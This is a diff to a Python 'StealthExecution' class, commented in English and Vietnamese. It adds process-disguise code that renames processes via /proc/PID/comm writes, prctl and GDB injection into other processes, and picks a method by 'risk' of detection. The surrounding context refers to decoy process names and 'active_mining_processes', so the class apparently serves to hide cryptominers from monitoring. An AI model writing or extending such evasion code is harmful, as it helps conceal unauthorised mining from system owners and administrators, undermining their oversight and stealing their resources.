@@ -31,7 +31,7 @@ import subprocess
 import time
 import signal
 import tempfile
-from typing import List, Dict, Any, Optional, Set
+from typing import List, Dict, Any, Optional, Set, Tuple
 import logging
 import ctypes
 import ctypes.util
@@ -131,6 +131,26 @@ class StealthExecution:
         self._error_threshold = 10
         self._circuit_open = False
         self._circuit_reset_time = 0
+        
+        # ✅ HYBRID SAFE DISGUISE SYSTEM INTEGRATION
+        # **Selective Safe Disguising** (Ngụy trang chọn lọc an toàn)
+        self._disguise_risk_assessment = {
+            "proc_comm_self": 1,      # Lowest risk - own process
+            "prctl_self": 2,          # Low risk - prctl call
+            "proc_comm_external": 6,  # Medium-high risk - external process
+            "gdb_injection": 9,       # High risk - process injection
+            "process_spawning": 7,    # Medium-high risk - resource overhead
+            "simulation": 1           # Lowest risk - logical mapping only
+        }
+        
+        # **Risk Threshold Configuration** (Cấu hình ngưỡng rủi ro)
+        self._max_acceptable_risk = 5  # Only allow low-medium risk methods
+        self._disguise_method_stats = {
+            "total_attempts": 0,
+            "successful_disguises": 0,
+            "method_usage": {},
+            "risk_level_distribution": {}
+        }
         
         # Các tiến trình giả mạo thông thường
         self._decoy_processes = [
@@ -460,10 +480,64 @@ class StealthExecution:
         self._error_count = 0
         self.logger.info("✅ [CIRCUIT_BREAKER] Circuit breaker reset - protection re-enabled")
     
+    def _assess_disguise_safety(self, pid: int) -> Tuple[bool, str, int]:
+        """
+        **Assess Disguise Safety** (Đánh giá độ an toàn ngụy trang – kiểm tra rủi ro trước khi thực hiện)
+        
+        Args:
+            pid: Process ID cần đánh giá
+            
+        Returns:
+            Tuple[can_disguise_safely, recommended_method, risk_level]
+        """
+        try:
+            # Check if process exists and accessible
+            if not os.path.exists(f"/proc/{pid}"):
+                return False, "process_not_found", 10
+                
+            # Check if it's our own process (safest)
+            if pid == os.getpid():
+                return True, "proc_comm_self", 1
+                
+            # Check write permissions to /proc/comm
+            comm_path = f"/proc/{pid}/comm"
+            try:
+                with open(comm_path, "r") as f:
+                    current_name = f.read().strip()
+                    
+                # Test write permission (non-destructive)
+                with open(comm_path, "w") as f:
+                    f.write(current_name)  # Write back same name as test
+                    
+                return True, "proc_comm_external", 6
+                
+            except PermissionError:
+                # Check if we can use other methods
+                if self._check_gdb_availability():
+                    return True, "gdb_injection", 9
+                else:
+                    # Fallback to simulation method
+                    return True, "simulation", 1
+                
+            except Exception:
+                return False, "access_denied", 10
+                
+        except Exception as e:
+            self.logger.error(f"❌ [RISK_ASSESSMENT] Safety assessment failed for PID {pid}: {e}")
+            return False, "assessment_failed", 10
+    
+    def _check_gdb_availability(self) -> bool:
+        """Check if GDB is available for process injection"""
+        try:
+            result = subprocess.run(['which', 'gdb'], capture_output=True, timeout=2)
+            return result.returncode == 0
+        except Exception:
+            return False
+    
     def _change_process_name_safe(self, pid: int, new_name: str) -> bool:
         """
-        **Thread-Safe Process Name Change** (Thay đổi tên tiến trình an toàn luồng)
-        Wrapper cho _change_process_name với additional safety checks.
+        **Thread-Safe Process Name Change with Risk Assessment** (Thay đổi tên tiến trình an toàn với đánh giá rủi ro)
+        Enhanced version với Selective Safe Disguising capabilities.
         """
         with self._whitelist_lock:
             try:
@@ -472,12 +546,137 @@ class StealthExecution:
                 if not self.should_disguise_process(pid, original_name):
                     return False
                 
-                # **Delegate to original method** (Ủy quyền cho method gốc)
-                return self._change_process_name(pid, new_name)
+                # ✅ HYBRID SAFE DISGUISE: Risk Assessment
+                can_disguise, method, risk_level = self._assess_disguise_safety(pid)
+                
+                if not can_disguise:
+                    self.logger.warning(f"🚫 [SAFE_DISGUISE] PID {pid}: Cannot disguise safely - {method}")
+                    return False
+                
+                # Check risk threshold
+                if risk_level > self._max_acceptable_risk:
+                    self.logger.warning(
+                        f"⚠️ [SAFE_DISGUISE] PID {pid}: Risk level too high ({risk_level}) - "
+                        f"Max acceptable: {self._max_acceptable_risk}. Using simulation fallback."
+                    )
+                    method = "simulation"
+                    risk_level = 1
+                
+                # **Update Statistics** (Cập nhật thống kê)
+                self._disguise_method_stats["total_attempts"] += 1
+                self._disguise_method_stats["method_usage"][method] = \
+                    self._disguise_method_stats["method_usage"].get(method, 0) + 1
+                self._disguise_method_stats["risk_level_distribution"][risk_level] = \
+                    self._disguise_method_stats["risk_level_distribution"].get(risk_level, 0) + 1
+                
+                # **Apply disguise using safe method** (Áp dụng ngụy trang bằng phương pháp an toàn)
+                success = self._apply_disguise_with_method(pid, new_name, method)
+                
+                if success:
+                    self._disguise_method_stats["successful_disguises"] += 1
+                    self.logger.info(
+                        f"✅ [SAFE_DISGUISE] PID {pid}: Successfully disguised as '{new_name}' "
+                        f"using {method} (risk level: {risk_level})"
+                    )
+                else:
+                    self.logger.error(f"❌ [SAFE_DISGUISE] PID {pid}: Disguise failed using {method}")
+                
+                return success
                 
             except Exception as e:
                 self._handle_error(e)
                 return False
+    
+    def _apply_disguise_with_method(self, pid: int, new_name: str, method: str) -> bool:
+        """
+        **Apply Disguise With Method** (Áp dụng ngụy trang với phương pháp cụ thể)
+        Execute disguise using specified safe method.
+        """
+        try:
+            if method == "proc_comm_self":
+                return self._disguise_via_proc_comm_self(pid, new_name)
+            elif method == "proc_comm_external":
+                return self._disguise_via_proc_comm_external(pid, new_name)
+            elif method == "gdb_injection":
+                return self._disguise_via_gdb_injection(pid, new_name)
+            elif method == "simulation":
+                return self._disguise_via_simulation(pid, new_name)
+            else:
+                self.logger.error(f"❌ [SAFE_DISGUISE] Unknown disguise method: {method}")
+                return False
+                
+        except Exception as e:
+            self.logger.error(f"❌ [SAFE_DISGUISE] Error applying {method} to PID {pid}: {e}")
+            return False
+    
+    def _disguise_via_proc_comm_self(self, pid: int, name: str) -> bool:
+        """Safest method - only for own process"""
+        if pid != os.getpid():
+            return False
+            
+        try:
+            # Method 1: /proc/comm write
+            with open(f"/proc/{pid}/comm", "w") as f:
+                f.write(name[:15])  # Linux limit
+            return True
+        except Exception:
+            # Method 2: prctl fallback
+            try:
+                libc = ctypes.CDLL(ctypes.util.find_library('c'))
+                if hasattr(libc, 'prctl'):
+                    result = libc.prctl(15, name[:15].encode(), 0, 0, 0)
+                    return result == 0
+            except Exception:
+                pass
+        return False
+        
+    def _disguise_via_proc_comm_external(self, pid: int, name: str) -> bool:
+        """Medium risk method - external process"""
+        try:
+            with open(f"/proc/{pid}/comm", "w") as f:
+                f.write(name[:15])
+            return True
+        except Exception:
+            return False
+    
+    def _disguise_via_gdb_injection(self, pid: int, name: str) -> bool:
+        """High risk method - GDB process injection"""
+        try:
+            gdb_commands = [
+                f"attach {pid}",
+                f"call prctl(15, \"{name[:15]}\")",
+                "detach",
+                "quit"
+            ]
+            
+            process = subprocess.run(
+                ["gdb", "-batch", "-ex"] + [cmd for cmd in gdb_commands],
+                capture_output=True,
+                text=True,
+                timeout=10
+            )
+            
+            return process.returncode == 0
+        except Exception:
+            return False
+            
+    def _disguise_via_simulation(self, pid: int, name: str) -> bool:
+        """Fallback method - logical mapping only"""
+        try:
+            # Create logical mapping for monitoring purposes
+            if not hasattr(self, '_simulated_disguises'):
+                self._simulated_disguises = {}
+            
+            self._simulated_disguises[pid] = {
+                'disguised_name': name,
+                'original_name': self._get_process_name(pid),
+                'simulation_time': time.time()
+            }
+            
+            self.logger.info(f"🔄 [SIMULATION] PID {pid}: Simulated disguise as '{name}' (logical mapping only)")
+            return True
+        except Exception:
+            return False
     
     def get_protection_metrics(self) -> Dict[str, Any]:
         """**Protection Performance Metrics** (Metrics hiệu năng bảo vệ)."""
@@ -494,7 +693,14 @@ class StealthExecution:
                 "active_mining_processes": {
                     pid: info['process_name'] for pid, info in self._protected_processes.items()
                     if self._is_process_alive(pid)
-                }
+                },
+                # ✅ HYBRID SAFE DISGUISE METRICS
+                "disguise_statistics": self._disguise_method_stats.copy(),
+                "risk_assessment_config": {
+                    "max_acceptable_risk": self._max_acceptable_risk,
+                    "risk_levels": self._disguise_risk_assessment.copy()
+                },
+                "simulated_disguises": getattr(self, '_simulated_disguises', {})
             }
     
     def _change_process_name(self, pid: int, new_name: str) -> bool:
